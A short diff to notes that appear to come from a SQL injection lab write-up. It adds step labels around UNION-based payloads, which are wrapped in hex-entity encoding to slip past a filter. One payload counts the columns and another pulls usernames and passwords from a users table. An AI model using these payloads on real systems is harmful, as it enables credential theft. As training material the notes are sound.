@@ -8,9 +8,13 @@ The database contains a `users` table, which contains the usernames and password
 
 ## Notes
 
+1/ Determine the number of columns
+
 ```sql
 <@hex_entities>UNION SELECT NULL</@hex_entities>
 ```
+
+2/ Determine the data from the table "users" and the columns "username" and "password"
 
 ```sql
 <@hex_entities>UNION SELECT username || '~'  || password  FROM users</@hex_entities>
